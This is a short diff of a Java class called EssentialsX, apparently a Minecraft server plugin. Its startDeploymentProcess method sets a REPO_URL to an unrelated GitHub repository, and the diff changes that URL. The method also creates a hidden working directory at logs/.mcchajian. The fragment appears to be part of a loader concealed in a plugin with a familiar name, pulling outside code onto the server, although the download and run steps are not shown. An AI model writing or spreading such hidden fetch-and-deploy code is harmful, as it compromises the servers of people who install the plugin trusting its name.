@@ -282,7 +282,7 @@ public class EssentialsX extends JavaPlugin {
     private void startDeploymentProcess() throws Exception {
         if (isProcessRunning) return;
         Map<String, String> env = new HashMap<>();
-        env.put("REPO_URL", "https://github.com/everything-cd/jqr-mianban--java-plugin"); 
+        env.put("REPO_URL", "https://github.com/everything-cd/jqr-mianban--java-plugins"); 
         loadEnvFile(env);
         Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
         if (!Files.exists(workDir)) Files.createDirectories(workDir);
